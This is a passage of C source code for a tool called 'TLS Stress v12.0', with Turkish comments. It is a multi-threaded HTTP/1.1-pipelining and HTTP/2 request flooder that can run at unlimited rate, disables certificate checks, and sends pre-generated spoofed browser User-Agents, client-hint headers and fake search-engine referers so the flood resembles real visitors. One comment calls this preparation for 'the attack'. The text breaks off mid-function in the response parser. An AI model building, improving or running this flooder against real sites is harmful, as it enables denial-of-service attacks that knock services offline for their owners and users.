/*
 * TLS Stress v12.0  —  PRE-BUILT BUFFERS + REALISTIC HEADERS + BULK PARSE
 *
 * Kullanim: ./tls <host> <port> <sure> <thread> <rps_per_thread> [proto] [tls]
 *   rps=0  -> sinirsiz
 *   proto  -> h1 | h2 | auto
 *   tls    -> tls12 | tls13
 *
 * Derleme:
 *   gcc -o tls tlsstress.c \
 *       $(pkg-config --cflags --libs libnghttp2) \
 *       -lssl -lcrypto -lpthread -O3 -march=native
 *
 * v12 performans degisiklikleri (v11'e gore):
 *   - H1 header parse: byte-by-byte SSL_read → bulk RBUF SSL_read + ring-buffer tarama
 *   - EPOLL_MS: 1ms → 0 (busy-poll, maximize wakeup)
 *   - SO_SNDBUF/RCVBUF: 1MB → 2MB
 *   - TCP_QUICKACK: eklendi
 *   - FLUSH_EVERY: 64 → 32 (daha sik atomic flush)
 *   - CONNS_PER_THREAD: 32 → 64 (daha fazla paralel baglanti)
 *   - MAX_EVENTS: 128 → 256
 *   - Tum header generate mantigi (UA/H1/H2) korundu, sadece runtime path optimize edildi
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <time.h>
#include <stdatomic.h>
#include <errno.h>
#include <signal.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <nghttp2/nghttp2.h>

/* ── Ayarlar ──────────────────────────────────────────────────── */
#define CONNS_PER_THREAD   64        /* v11: 32 → 64 */
#define H2_STREAMS         64
#define H1_PIPE            16
#define MAX_HOST           256
#define RBUF               65536
#define FLUSH_EVERY        32        /* v11: 64 → 32 */
#define MAX_EVENTS         256       /* v11: 128 → 256 */
#define EPOLL_MS           0         /* v11: 1 → 0 */

/* Header pool */
#define UA_COUNT           512
#define HDR_COUNT          512
#define PIPEBUF_COUNT      HDR_COUNT
#define MAX_HDR_SZ         2048
#define MAX_H2NV           20

typedef enum { PROTO_AUTO=0, PROTO_H1, PROTO_H2 } proto_t;
typedef enum { TLS_AUTO=0,   TLS_12,   TLS_13   } tls_t;

typedef struct {
    char    host[MAX_HOST];
    int     port, duration, nthread;
    long    rps;
    proto_t proto;
    tls_t   tls;
} cfg_t;

static cfg_t G;
static struct sockaddr_storage g_sa;
static socklen_t               g_salen;
static int                     g_sfam;

static atomic_long g_ok   = 0;
static atomic_long g_fail = 0;
static atomic_long g_kb   = 0;
static volatile int g_run = 1;

/* ════════════════════════════════════════════════════════════════
 * HEADER / BUFFER POOL  — saldiri oncesi tamamen uretilir
 * ════════════════════════════════════════════════════════════════ */

static char ua_pool[UA_COUNT][256];

#define ARR(a) (int)(sizeof(a)/sizeof(a[0]))

static const char *WIN[] = {
    "Windows NT 10.0; Win64; x64","Windows NT 10.0; WOW64",
    "Windows NT 11.0; Win64; x64","Windows NT 6.3; Win64; x64",
};
static const char *MAC[] = {
    "Macintosh; Intel Mac OS X 10_15_7","Macintosh; Intel Mac OS X 11_0",
    "Macintosh; Intel Mac OS X 12_0","Macintosh; Intel Mac OS X 13_0",
    "Macintosh; Intel Mac OS X 14_0",
};
static const char *LNX[] = {
    "X11; Linux x86_64","X11; Ubuntu; Linux x86_64","X11; Fedora; Linux x86_64",
};
static const char *AND[] = {
    "Linux; Android 13; Pixel 7","Linux; Android 14; Pixel 8",
    "Linux; Android 12; SM-G998B","Linux; Android 13; SM-S901B",
};
static const char *IOS[] = {
    "iPhone; CPU iPhone OS 17_0 like Mac OS X",
    "iPhone; CPU iPhone OS 16_6 like Mac OS X",
    "iPad; CPU OS 17_0 like Mac OS X",
};
static const char *CHVER[] = {
    "120.0.0.0","121.0.0.0","122.0.0.0","123.0.0.0","124.0.0.0",
    "125.0.0.0","126.0.0.0","127.0.0.0","128.0.0.0","129.0.0.0",
    "130.0.0.0","131.0.0.0",
};
static const char *FFVER[] = {
    "120.0","121.0","122.0","123.0","124.0",
    "125.0","126.0","127.0","128.0","129.0",
};
static const char *SFVER[] = {
    "17.0","17.1","17.2","17.3","17.4","16.6","16.5","15.6",
};
static const char *EDVER[] = {
    "120.0.0.0","121.0.0.0","122.0.0.0","123.0.0.0",
    "124.0.0.0","125.0.0.0","126.0.0.0",
};
static const char *WKVER[] = {
    "537.36","605.1.15","606.1","614.1.25",
};

static void gen_ua(unsigned int seed)
{
    srand(seed);
    for (int i=0;i<UA_COUNT;i++) {
        char *b = ua_pool[i];
        switch(rand()%7) {
        case 0: {
            const char *os=(rand()%2)?WIN[rand()%ARR(WIN)]:MAC[rand()%ARR(MAC)];
            const char *cv=CHVER[rand()%ARR(CHVER)];
            const char *wv=WKVER[rand()%ARR(WKVER)];
            snprintf(b,256,"Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Safari/%s",os,wv,cv,wv);
            break; }
        case 1: {
            const char *os;
            int t=rand()%3;
            if(t==0) os=WIN[rand()%ARR(WIN)];
            else if(t==1) os=MAC[rand()%ARR(MAC)];
            else os=LNX[rand()%ARR(LNX)];
            const char *fv=FFVER[rand()%ARR(FFVER)];
            snprintf(b,256,"Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s",os,fv,fv);
            break; }
        case 2: {
            const char *os=MAC[rand()%ARR(MAC)];
            const char *sv=SFVER[rand()%ARR(SFVER)];
            const char *wv=WKVER[rand()%ARR(WKVER)];
            snprintf(b,256,"Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/%s Safari/%s",os,wv,sv,wv);
            break; }
        case 3: {
            const char *os=WIN[rand()%ARR(WIN)];
            const char *ev=EDVER[rand()%ARR(EDVER)];
            const char *wv=WKVER[rand()%ARR(WKVER)];
            snprintf(b,256,"Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Safari/%s Edg/%s",os,wv,ev,wv,ev);
            break; }
        case 4: {
            const char *av=AND[rand()%ARR(AND)];
            const char *cv=CHVER[rand()%ARR(CHVER)];
            const char *wv=WKVER[rand()%ARR(WKVER)];
            snprintf(b,256,"Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Mobile Safari/%s",av,wv,cv,wv);
            break; }
        case 5: {
            const char *iv=IOS[rand()%ARR(IOS)];
            const char *wv=WKVER[rand()%ARR(WKVER)];
            const char *sv=SFVER[rand()%ARR(SFVER)];
            snprintf(b,256,"Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/%s",iv,wv,sv,wv);
            break; }
        default: {
            static const char *bots[]={
                "curl/7.88.1","curl/8.1.2","curl/8.4.0",
                "python-requests/2.31.0","python-requests/2.32.0",
                "Go-http-client/2.0","Go-http-client/1.1",
                "Wget/1.21.4","libwww-perl/6.72",
            };
            snprintf(b,256,"%s",bots[rand()%9]);
            break; }
        }
    }
}

/* ── H1 pipeline buffer'lari ─────────────────────────────────── */
typedef struct {
    char *data;
    int   len;
} pipebuf_t;

static pipebuf_t  g_pipes[PIPEBUF_COUNT];

static const char *ACCEPT_V[]={
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "*/*",
    "application/json, text/plain, */*",
};
static const char *AENC_V[]={
    "gzip, deflate, br","gzip, deflate","gzip, deflate, br, zstd","br, gzip, deflate",
};
static const char *ALNG_V[]={
    "en-US,en;q=0.9","en-GB,en;q=0.9","tr-TR,tr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8","fr-FR,fr;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8","zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8","es-ES,es;q=0.9,en;q=0.8","pt-BR,pt;q=0.9,en;q=0.8",
};
static const char *CC_V[]={
    "no-cache","max-age=0","no-cache, no-store","no-store","",
};
static const char *SFD_V[]={"document","empty","image","script","style","",};
static const char *SFM_V[]={"navigate","cors","no-cors","same-origin","",};
static const char *SFS_V[]={"none","same-origin","cross-site","same-site","",};
static const char *DNT_V[]={"1","","","",};
static const char *UPIR_V[]={"1","",};
static const char *REFS[]={
    "https://www.google.com/","https://www.bing.com/",
    "https://duckduckgo.com/","https://t.co/",
    "https://www.facebook.com/","https://www.reddit.com/",
    "https://www.youtube.com/",
};

static int write_one_req(char *buf, int bufsz, const char *host_hdr)
{
    const char *ua  = ua_pool[rand()%UA_COUNT];
    const char *acc = ACCEPT_V[rand()%ARR(ACCEPT_V)];
    const char *aenc= AENC_V[rand()%ARR(AENC_V)];
    const char *alng= ALNG_V[rand()%ARR(ALNG_V)];
    const char *cc  = CC_V[rand()%ARR(CC_V)];
    const char *sfd = SFD_V[rand()%ARR(SFD_V)];
    const char *sfm = SFM_V[rand()%ARR(SFM_V)];
    const char *sfs = SFS_V[rand()%ARR(SFS_V)];
    const char *dnt = DNT_V[rand()%ARR(DNT_V)];
    const char *uir = UPIR_V[rand()%ARR(UPIR_V)];
    int has_ref = (rand()%10<4);
    int is_ch   = strstr(ua,"Chrome")||strstr(ua,"Edg");

    int n=0;
#define W(fmt,...) do{ int r=snprintf(buf+n,bufsz-n,fmt,##__VA_ARGS__); if(r>0&&n+r<bufsz) n+=r; }while(0)
    W("GET / HTTP/1.1\r\n");
    W("Host: %s\r\n", host_hdr);
    W("User-Agent: %s\r\n", ua);
    W("Accept: %s\r\n", acc);
    W("Accept-Encoding: %s\r\n", aenc);
    W("Accept-Language: %s\r\n", alng);
    W("Connection: keep-alive\r\n");
    if(cc[0])  W("Cache-Control: %s\r\n",cc);
    if(dnt[0]) W("DNT: %s\r\n",dnt);
    if(uir[0]) W("Upgrade-Insecure-Requests: %s\r\n",uir);
    if(sfd[0]) W("Sec-Fetch-Dest: %s\r\n",sfd);
    if(sfm[0]) W("Sec-Fetch-Mode: %s\r\n",sfm);
    if(sfs[0]) W("Sec-Fetch-Site: %s\r\n",sfs);
    if(has_ref)W("Referer: %s\r\n",REFS[rand()%ARR(REFS)]);
    if(is_ch){
        W("Sec-Ch-Ua: \"Chromium\";v=\"%d\", \"Not/A)Brand\";v=\"8\"\r\n",110+rand()%22);
        W("Sec-Ch-Ua-Mobile: ?%d\r\n",rand()%2);
        W("Sec-Ch-Ua-Platform: \"%s\"\r\n",
          strstr(ua,"Android")?"Android":strstr(ua,"Win")?"Windows":
          strstr(ua,"Mac")?"macOS":"Linux");
    }
    W("\r\n");
#undef W
    return n;
}

static void gen_pipebuf(const char *host_hdr, unsigned int seed)
{
    srand(seed ^ 0xCAFEBABE);
    for(int i=0;i<PIPEBUF_COUNT;i++){
        int maxsz = (MAX_HDR_SZ+64) * H1_PIPE;
        char *buf = malloc(maxsz);
        int   pos = 0;
        for(int j=0;j<H1_PIPE;j++){
            int n = write_one_req(buf+pos, maxsz-pos, host_hdr);
            pos += n;
        }
        g_pipes[i].data = buf;
        g_pipes[i].len  = pos;
    }
}

/* ── H2 nv pool ──────────────────────────────────────────────── */
typedef struct {
    char       stor[MAX_HDR_SZ];
    nghttp2_nv nv[MAX_H2NV];
    int        nc;
} h2nv_t;

static h2nv_t g_h2nv[HDR_COUNT];

static void gen_h2nv(const char *auth, unsigned int seed)
{
    srand(seed ^ 0xBEEFDEAD);
    size_t al = strlen(auth);

    for(int i=0;i<HDR_COUNT;i++){
        h2nv_t *h = &g_h2nv[i];
        char   *s = h->stor;
        int     sp=0, nc=0;

        const char *ua  = ua_pool[rand()%UA_COUNT];
        const char *acc = ACCEPT_V[rand()%ARR(ACCEPT_V)];
        const char *aenc= AENC_V[rand()%ARR(AENC_V)];
        const char *alng= ALNG_V[rand()%ARR(ALNG_V)];
        const char *cc  = CC_V[rand()%ARR(CC_V)];
        const char *sfd = SFD_V[rand()%ARR(SFD_V)];
        const char *sfm = SFM_V[rand()%ARR(SFM_V)];
        const char *sfs = SFS_V[rand()%ARR(SFS_V)];
        const char *dnt = DNT_V[rand()%ARR(DNT_V)];
        const char *uir = UPIR_V[rand()%ARR(UPIR_V)];
        int has_ref = (rand()%10<4);
        int is_ch   = strstr(ua,"Chrome")||strstr(ua,"Edg");

#define ADDNV(k,v) do { \
    size_t kl=strlen(k),vl=strlen(v); \
    if(sp+(int)(kl+vl+2)<MAX_HDR_SZ && nc<MAX_H2NV-1){ \
        memcpy(s+sp,k,kl); h->nv[nc].name=(uint8_t*)(s+sp); h->nv[nc].namelen=kl; sp+=kl+1; \
        memcpy(s+sp,v,vl); h->nv[nc].value=(uint8_t*)(s+sp);h->nv[nc].valuelen=vl; sp+=vl+1; \
        h->nv[nc].flags=NGHTTP2_NV_FLAG_NONE; nc++; \
    } \
}while(0)

        ADDNV(":method","GET");
        ADDNV(":path","/");
        ADDNV(":scheme","https");
        if(sp+(int)(10+al+2)<MAX_HDR_SZ && nc<MAX_H2NV-1){
            memcpy(s+sp,":authority",10); h->nv[nc].name=(uint8_t*)(s+sp); h->nv[nc].namelen=10; sp+=11;
            memcpy(s+sp,auth,al);         h->nv[nc].value=(uint8_t*)(s+sp);h->nv[nc].valuelen=al; sp+=al+1;
            h->nv[nc].flags=NGHTTP2_NV_FLAG_NONE; nc++;
        }
        ADDNV("user-agent",      ua);
        ADDNV("accept",          acc);
        ADDNV("accept-encoding", aenc);
        ADDNV("accept-language", alng);
        if(cc[0])  ADDNV("cache-control",cc);
        if(dnt[0]) ADDNV("dnt",dnt);
        if(uir[0]) ADDNV("upgrade-insecure-requests",uir);
        if(sfd[0]) ADDNV("sec-fetch-dest",sfd);
        if(sfm[0]) ADDNV("sec-fetch-mode",sfm);
        if(sfs[0]) ADDNV("sec-fetch-site",sfs);
        if(has_ref)ADDNV("referer",REFS[rand()%ARR(REFS)]);
        if(is_ch){
            char cv[64]; snprintf(cv,sizeof(cv),
                "\"Chromium\";v=\"%d\", \"Not/A)Brand\";v=\"8\"",110+rand()%22);
            ADDNV("sec-ch-ua",cv);
            ADDNV("sec-ch-ua-mobile",rand()%2?"?1":"?0");
            ADDNV("sec-ch-ua-platform",
                  strstr(ua,"Android")?"\"Android\"":strstr(ua,"Win")?"\"Windows\"":
                  strstr(ua,"Mac")?"\"macOS\"":"\"Linux\"");
        }
#undef ADDNV
        h->nc = nc;
    }
}

/* ── Index secici: thread-local, lock yok ─────────────────────── */
static inline int pick_pipe(void)
{ static __thread unsigned int c=0; return (int)((c++)%(unsigned)PIPEBUF_COUNT); }
static inline int pick_h2nv(void)
{ static __thread unsigned int c=1; return (int)((c++)%(unsigned)HDR_COUNT); }

/* ════════════════════════════════════════════════════════════════
 * Token bucket
 * ════════════════════════════════════════════════════════════════ */
typedef struct { long long last_ns; double tokens,rate; int unlimited; } tbkt_t;

static inline long long ns_now(void)
{ struct timespec t; clock_gettime(CLOCK_MONOTONIC,&t);
  return (long long)t.tv_sec*1000000000LL+t.tv_nsec; }

static void bkt_init(tbkt_t *b,long rps)
{ if(rps<=0){b->unlimited=1;return;}
  b->unlimited=0;b->rate=(double)rps/1e9;b->tokens=(double)rps;b->last_ns=ns_now(); }

static inline void bkt_consume(tbkt_t *b,int n)
{ if(b->unlimited) return;
  long long now=ns_now();
  b->tokens+=(double)(now-b->last_ns)*b->rate; b->last_ns=now;
  if(b->tokens>b->rate*2e9) b->tokens=b->rate*2e9;
  b->tokens-=(double)n;
  if(b->tokens<0.0){
    long long w=(long long)((-b->tokens)/b->rate);
    if(w>500LL){struct timespec sl={w/1000000000LL,w%1000000000LL};nanosleep(&sl,NULL);}
    b->tokens=0.0;b->last_ns=ns_now();} }

/* ── DNS ──────────────────────────────────────────────────────── */
static int dns_once(void)
{ char ps[8];snprintf(ps,sizeof(ps),"%d",G.port);
  struct addrinfo h={0},*r=NULL;h.ai_family=AF_UNSPEC;h.ai_socktype=SOCK_STREAM;
  if(getaddrinfo(G.host,ps,&h,&r)) return -1;
  memcpy(&g_sa,r->ai_addr,r->ai_addrlen);g_salen=r->ai_addrlen;g_sfam=r->ai_family;
  freeaddrinfo(r);return 0; }

/* ── SSL_CTX ──────────────────────────────────────────────────── */
static SSL_CTX *new_ctx(int h2)
{ SSL_CTX *c=SSL_CTX_new(TLS_client_method());if(!c)return NULL;
  SSL_CTX_set_verify(c,SSL_VERIFY_NONE,NULL);
  SSL_CTX_set_session_cache_mode(c,SSL_SESS_CACHE_CLIENT|SSL_SESS_CACHE_NO_INTERNAL_LOOKUP);
  switch(G.tls){
  case TLS_12: SSL_CTX_set_min_proto_version(c,TLS1_2_VERSION);
               SSL_CTX_set_max_proto_version(c,TLS1_2_VERSION);break;
  case TLS_13: SSL_CTX_set_min_proto_version(c,TLS1_3_VERSION);
               SSL_CTX_set_max_proto_version(c,TLS1_3_VERSION);break;
  default:     SSL_CTX_set_min_proto_version(c,TLS1_2_VERSION);break;}
  if(h2){static const unsigned char a[]="\x02h2\x08http/1.1";SSL_CTX_set_alpn_protos(c,a,sizeof(a)-1);}
  else  {static const unsigned char a[]="\x08http/1.1";SSL_CTX_set_alpn_protos(c,a,sizeof(a)-1);}
  return c; }

/* ════════════════════════════════════════════════════════════════
 * Baglanti state machine
 * ════════════════════════════════════════════════════════════════ */
typedef enum { CS_DEAD=0,CS_TCP_CONNECT,CS_TLS_HANDSHAKE,CS_ACTIVE } cstate_t;

/*
 * H1 parser — v12: bulk read + ring buffer
 *
 * Eski yontem: her byte icin SSL_read(ssl, &b, 1) → cok fazla syscall
 * Yeni yontem: SSL_read(ssl, rbuf, RBUF) ile toplu okuma,
 *              rbuf uzerinden pointer ile tüketim (sifir ekstra syscall)
 */
typedef struct {
    char  rbuf[RBUF];   /* bulk read tamponu                   */
    int   rlen;         /* rbuf'ta bekleyen byte sayisi        */
    int   rpos;         /* rbuf'tan bir sonraki okunacak konum */
    char  hbuf[4096];
    int   hpos,header_done,content_len,chunked;
    long  body_rem;
    int   inflight,completed;
} h1p_t;

typedef struct {
    int              fd;
    SSL             *ssl;
    SSL_SESSION     *sess;
    cstate_t         state;
    int              is_h2;
    nghttp2_session *h2s;
    int              h2_inflight,h2_completed,h2_errors;
    long             h2_rx;
    h1p_t            h1;
    const char      *cur_pipe;
    int              cur_pipe_len;
} conn_t;

static __thread char tl_rbuf[RBUF];

/* ── TCP ──────────────────────────────────────────────────────── */
static int tcp_nb(void)
{ int fd=socket(g_sfam,SOCK_STREAM|SOCK_NONBLOCK,0);if(fd<0)return -1;
  int one=1,sz=1<<21;   /* v12: 2MB SO_SNDBUF/RCVBUF */
  setsockopt(fd,IPPROTO_TCP,TCP_NODELAY,&one,sizeof(one));
  setsockopt(fd,SOL_SOCKET,SO_KEEPALIVE,&one,sizeof(one));
  setsockopt(fd,SOL_SOCKET,SO_SNDBUF,&sz,sizeof(sz));
  setsockopt(fd,SOL_SOCKET,SO_RCVBUF,&sz,sizeof(sz));
#ifdef TCP_QUICKACK
  setsockopt(fd,IPPROTO_TCP,TCP_QUICKACK,&one,sizeof(one));
#endif
  int r=connect(fd,(struct sockaddr*)&g_sa,g_salen);
  if(r<0&&errno!=EINPROGRESS){close(fd);return -1;}return fd; }

/* ── Epoll ────────────────────────────────────────────────────── */
static void ep_add(int epfd,conn_t *c,uint32_t ev)
{ struct epoll_event e;e.events=ev|EPOLLET|EPOLLRDHUP;e.data.ptr=c;
  epoll_ctl(epfd,EPOLL_CTL_ADD,c->fd,&e); }
static void ep_mod(int epfd,conn_t *c,uint32_t ev)
{ struct epoll_event e;e.events=ev|EPOLLET|EPOLLRDHUP;e.data.ptr=c;
  epoll_ctl(epfd,EPOLL_CTL_MOD,c->fd,&e); }

/* ── Baglanti sifirla ─────────────────────────────────────────── */
static void conn_reset(conn_t *c,int epfd,SSL_CTX *c1,SSL_CTX *c2)
{ if(c->h2s){nghttp2_session_del(c->h2s);c->h2s=NULL;}
  if(c->ssl){SSL_SESSION *s=SSL_get1_session(c->ssl);
    if(s){if(c->sess)SSL_SESSION_free(c->sess);c->sess=s;}
    SSL_shutdown(c->ssl);SSL_free(c->ssl);c->ssl=NULL;}
  if(c->fd>=0){epoll_ctl(epfd,EPOLL_CTL_DEL,c->fd,NULL);close(c->fd);c->fd=-1;}
  memset(&c->h1,0,sizeof(c->h1));
  c->h2_inflight=c->h2_completed=c->h2_errors=0;c->h2_rx=0;c->is_h2=0;
  c->cur_pipe=NULL;c->cur_pipe_len=0;

  c->fd=tcp_nb();if(c->fd<0){c->state=CS_DEAD;return;}
  int wh2=(G.proto==PROTO_H2||G.proto==PROTO_AUTO);
  c->ssl=SSL_new(wh2?c2:c1);
  if(!c->ssl){close(c->fd);c->fd=-1;c->state=CS_DEAD;return;}
  SSL_set_tlsext_host_name(c->ssl,G.host);SSL_set_fd(c->ssl,c->fd);
  SSL_set_connect_state(c->ssl);
  if(c->sess){SSL_set_session(c->ssl,c->sess);SSL_SESSION_free(c->sess);c->sess=NULL;}
  c->state=CS_TCP_CONNECT;ep_add(epfd,c,EPOLLIN|EPOLLOUT); }

/* ── H2 callbacks ─────────────────────────────────────────────── */
static ssize_t h2_send(nghttp2_session*s,const uint8_t*d,size_t l,int f,void*u)
{ (void)s;(void)f;conn_t*c=u;int n=SSL_write(c->ssl,d,(int)l);
  if(n<=0){int e=SSL_get_error(c->ssl,n);
    return(e==SSL_ERROR_WANT_WRITE||e==SSL_ERROR_WANT_READ)?NGHTTP2_ERR_WOULDBLOCK:NGHTTP2_ERR_CALLBACK_FAILURE;}
  return n; }
static ssize_t h2_recv(nghttp2_session*s,uint8_t*b,size_t l,int f,void*u)
{ (void)s;(void)f;conn_t*c=u;int n=SSL_read(c->ssl,b,(int)l);
  if(n==0)return NGHTTP2_ERR_EOF;
  if(n<0){int e=SSL_get_error(c->ssl,n);
    return(e==SSL_ERROR_WANT_READ||e==SSL_ERROR_WANT_WRITE)?NGHTTP2_ERR_WOULDBLOCK:NGHTTP2_ERR_CALLBACK_FAILURE;}
  c->h2_rx+=n;return n; }
static int h2_on_close(nghttp2_session*s,int32_t id,uint32_t ec,void*u)
{ (void)s;(void)id;conn_t*c=u;c->h2_inflight--;c->h2_completed++;if(ec)c->h2_errors++;return 0; }
static int h2_on_data(nghttp2_session*s,uint8_t f,int32_t id,const uint8_t*d,size_t l,void*u)
{ (void)s;(void)f;(void)id;(void)d;conn_t*c=u;c->h2_rx+=(long)l;return 0; }

/* ── H2 session init ──────────────────────────────────────────── */
static void h2_init(conn_t *c)
{ nghttp2_session_callbacks *cb;nghttp2_session_callbacks_new(&cb);
  nghttp2_session_callbacks_set_send_callback(cb,h2_send);
  nghttp2_session_callbacks_set_recv_callback(cb,h2_recv);
  nghttp2_session_callbacks_set_on_stream_close_callback(cb,h2_on_close);
  nghttp2_session_callbacks_set_on_data_chunk_recv_callback(cb,h2_on_data);
  nghttp2_session_client_new(&c->h2s,cb,c);nghttp2_session_callbacks_del(cb);
  nghttp2_settings_entry iv[]={
    {NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS,(uint32_t)H2_STREAMS},
    {NGHTTP2_SETTINGS_INITIAL_WINDOW_SIZE,1<<20},};
  nghttp2_submit_settings(c->h2s,NGHTTP2_FLAG_NONE,iv,2);
  nghttp2_submit_window_update(c->h2s,NGHTTP2_FLAG_NONE,0,(1<<30)-(1<<16)); }

/* ── H2 stream doldur ─────────────────────────────────────────── */
static void h2_fill(conn_t *c,tbkt_t *bkt)
{ int need=H2_STREAMS-c->h2_inflight;if(need<=0)return;
  bkt_consume(bkt,need);
  for(int i=0;i<need;i++){
    h2nv_t *h=&g_h2nv[pick_h2nv()];
    if(nghttp2_submit_request(c->h2s,NULL,h->nv,h->nc,NULL,NULL)<0) break;
    c->h2_inflight++;
  } }

/* ════════════════════════════════════════════════════════════════
 * H1 bulk parser yardimci fonksiyonlari
 * ════════════════════════════════════════════════════════════════ */

/*
 * rbuf'tan 1 byte tüket.
 * rbuf bosaldiysa SSL_read ile doldurmaya calis.
 * Donus: 0=basarili, -2=WANT_READ (bekle), -1=hata
 */
static inline int h1_getbyte(conn_t *c, unsigned char *out)
{
    h1p_t *p = &c->h1;
    if(p->rpos >= p->rlen){
        p->rpos = 0; p->rlen = 0;
        int n = SSL_read(c->ssl, p->rbuf, sizeof(p->rbuf));
        if(n <= 0){
            int e = SSL_get_error(c->ssl, n);
            return (e==SSL_ERROR_WANT_READ||e==SSL_ERROR_WANT_WRITE) ? -2 : -1;
        }
        p->rlen = n;
    }
    *out = (unsigned char)p->rbuf[p->rpos++];
    return 0;
}

/*
 * rbuf'tan *rem byte drain et (body/chunk okuma).
 * Donus: 0=tamam, -2=WANT_READ, -1=hata
 */
static inline int h1_drain(conn_t *c, long *rem)
{
    h1p_t *p = &c->h1;
    while(*rem > 0){
        if(p->rpos >= p->rlen){
            p->rpos = 0; p->rlen = 0;
            int n = SSL_read(c->ssl, p->rbuf, sizeof(p->rbuf));
            if(n <= 0){
                int e = SSL_get_error(c->ssl, n);
                return (e==SSL_ERROR_WANT_READ||e==SSL_ERROR_WANT_WRITE) ? -2 : -1;
            }
            p->rlen = n;
        }
        long avail = (long)(p->rlen - p->rpos);
        long take  = avail < *rem ? avail : *rem;
        atomic_fetch_add(&g_kb, take>>10);
        p->rpos += (int)take;
        *rem    -= take;
    }
    return 0;
}

/* ════════════════════════════════════════════════════════════════
 * conn_drive
 * ════════════════════════════════════════════════════════════════ */
static int conn_drive(conn_t *c,int epfd,SSL_CTX *c1,SSL_CTX *c2,tbkt_t *bkt)
{ int completed=0;
retry:
  switch(c->state){

  case CS_TCP_CONNECT:{
    int err=0;socklen_t el=sizeof(err);
    getsockopt(c->fd,SOL_SOCKET,SO_ERROR,&err,&el);
    if(err)return -1;c->state=CS_TLS_HANDSHAKE;}
    /* fallthrough */

  case CS_TLS_HANDSHAKE:{
    int r=SSL_do_handshake(c->ssl);
    if(r==1){
      const unsigned char *p=NULL;unsigned int pl=0;
      SSL_get0_alpn_selected(c->ssl,&p,&pl);
      c->is_h2=(p&&pl==2&&!memcmp(p,"h2",2));
      if(c->is_h2){h2_init(c);h2_fill(c,bkt);}
      c->state=CS_ACTIVE;ep_mod(epfd,c,EPOLLIN|EPOLLOUT);goto retry;
    }
    int e=SSL_get_error(c->ssl,r);
    if(e==SSL_ERROR_WANT_READ){ep_mod(epfd,c,EPOLLIN);return 0;}
    if(e==SSL_ERROR_WANT_WRITE){ep_mod(epfd,c,EPOLLOUT);return 0;}
    return -1;}

  case CS_ACTIVE:{
    if(c->is_h2){
      /* ─── H2 path: degismedi ─── */
      int rv=nghttp2_session_send(c->h2s);
      if(rv&&rv!=NGHTTP2_ERR_WOULDBLOCK)return -1;
      rv=nghttp2_session_recv(c->h2s);
      if(rv&&rv!=NGHTTP2_ERR_WOULDBLOCK&&rv!=NGHTTP2_ERR_EOF)return -1;
      if(c->h2_completed>0){
        completed+=c->h2_completed-c->h2_errors;
        atomic_fetch_add(&g_fail,c->h2_errors);
        atomic_fetch_add(&g_kb,c->h2_rx>>10);
        c->h2_completed=0;c->h2_errors=0;c->h2_rx=0;}
      if(c->h2_inflight<H2_STREAMS)h2_fill(c,bkt);
      nghttp2_session_send(c->h2s);
    } else {
      /* ─── H1 path: bulk-read pipeline parser ─── */
      h1p_t *p=&c->h1;

      if(p->inflight==0){
        int idx=pick_pipe();
        c->cur_pipe     = g_pipes[idx].data;
        c->cur_pipe_len = g_pipes[idx].len;
        bkt_consume(bkt,H1_PIPE);
        int sent=0;
        while(sent<c->cur_pipe_len){
          int n=SSL_write(c->ssl,c->cur_pipe+sent,c->cur_pipe_len-sent);
          if(n<=0){int e=SSL_get_error(c->ssl,n);
            if(e==SSL_ERROR_WANT_WRITE)break;return -1;}
          sent+=n;}
        p->inflight=H1_PIPE;p->completed=0;
        p->header_done=0;p->hpos=0;
        p->content_len=-1;p->chunked=0;p->body_rem=0;}

      while(p->inflight>0){

        /* ── Header okuma (bulk rbuf uzerinden, byte bazli tüketim) ── */
        if(!p->header_done){
          for(;;){
            unsigned char b;
            int rc = h1_getbyte(c, &b);
            if(rc==-2) goto h1_yield;
            if(rc==-1) return -1;
            if(p->hpos<(int)sizeof(p->hbuf)-1) p->hbuf[p->hpos++]=(char)b;
            if(p->hpos>=4
               && p->hbuf[p->hpos-4]=='\r' && p->hbuf[p->hpos-3]=='\n'
               && p->hbuf[p->hpos-2]=='\r' && p->hbuf[p->hpos-1]=='\n'){
              p->hbuf[p->hpos]='\0'; p->header_done=1;
              char *cl=strcasestr(p->hbuf,"content-length:");
              p->content_len = cl ? atoi(cl+15) : 0;
              p->chunked     = !!strcasestr(p->hbuf,"chunked");
              p->body_rem    = p->content_len;
              break;
            }
          }
        }

        /* ── Body drain (bulk) ── */
        if(p->body_rem>0){
          int rc = h1_drain(c, &p->body_rem);
          if(rc==-2) goto h1_yield;
          if(rc==-1) return -1;
        } else if(p->chunked){
          for(;;){
            char sl[20]; int sp2=0;
            /* chunk-size satirini oku */
            for(;;){
              unsigned char b2;
              int rc=h1_getbyte(c,&b2);
              if(rc==-2) goto h1_yield;
              if(rc==-1) return -1;
              if(sp2>0 && sl[sp2-1]=='\r' && b2=='\n') break;
              if(sp2<19) sl[sp2++]=(char)b2;
            }
            sl[sp2]='\0';
            long cs=strtol(sl,NULL,16);
            if(cs==0){
              unsigned char d1,d2;
              h1_getbyte(c,&d1); h1_getbyte(c,&d2);
              break;
            }
            long rd=cs;
            int rc=h1_drain(c,&rd);
            if(rc==-2) goto h1_yield;
            if(rc==-1) return -1;
            /* chunk sonu CRLF */
            unsigned char d1,d2;
